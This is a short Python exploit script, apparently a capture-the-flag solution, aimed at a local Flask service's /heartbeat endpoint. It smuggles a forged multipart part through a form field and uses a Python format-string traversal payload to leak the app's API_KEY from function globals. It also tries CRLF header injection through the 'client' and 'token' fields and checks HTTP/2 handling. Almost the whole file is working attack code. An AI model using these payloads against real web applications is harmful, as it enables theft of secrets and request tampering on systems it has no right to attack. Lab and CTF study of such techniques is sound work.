import httpx
import socket

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 尝试 CRLF 注入 - 在 client 或 token 参数中注入换行符
# httpx.post 的 headers 字典会被用于构建 HTTP 请求

# 测试1: 尝试在 token 中注入换行
crlf_token = "test\r\nX-Injected: hacked"
params = {
    'text': 'test',
    'client': 'X-Test',
    'token': crlf_token
}
try:
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=5.0)
    print(f"[CRLF in token] Status: {r.status_code}, Response: {r.text[:200]}")
except Exception as e:
    print(f"[CRLF in token] Error: {e}")

# 测试2: 尝试在 client 中注入
crlf_client = "X-Test\r\nX-Injected: hacked"
params2 = {
    'text': 'test',
    'client': crlf_client,
    'token': 'value'
}
try:
    r = httpx.post(f"{TARGET}/heartbeat", data=params2, timeout=5.0)
    print(f"[CRLF in client] Status: {r.status_code}, Response: {r.text[:200]}")
except Exception as e:
    print(f"[CRLF in client] Error: {e}")

# 测试3: 看看 httpx 是否有 HTTP/2 支持并且不同行为
print("\n[*] Testing with httpx HTTP/2...")
try:
    with httpx.Client(http2=True) as client:
        r = client.get(f"{TARGET}/")
        print(f"HTTP version used: {r.http_version}")
except Exception as e:
    print(f"HTTP/2 test error: {e}")
